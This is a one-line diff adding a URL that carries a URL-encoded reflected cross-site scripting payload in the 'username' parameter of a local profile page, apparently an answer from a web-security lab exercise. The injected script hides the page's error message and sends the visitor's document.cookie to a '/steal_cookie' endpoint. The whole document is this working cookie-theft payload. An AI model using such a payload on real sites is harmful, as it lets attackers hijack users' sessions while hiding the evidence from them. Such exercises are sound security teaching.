@@ -1,0 +1,1 @@
+http://localhost:3000/profile?username=%3Cscript%3Evar%20element%20=%20document.getElementsByClassName(%27error%27)[0];element.hidden=true;var%20oReq%20=%20new%20XMLHttpRequest();oReq.open(%22GET%22,%20%22http://localhost:3000/steal_cookie?cookie=%22%2Bdocument.cookie);oReq.send();%3C/script%3E
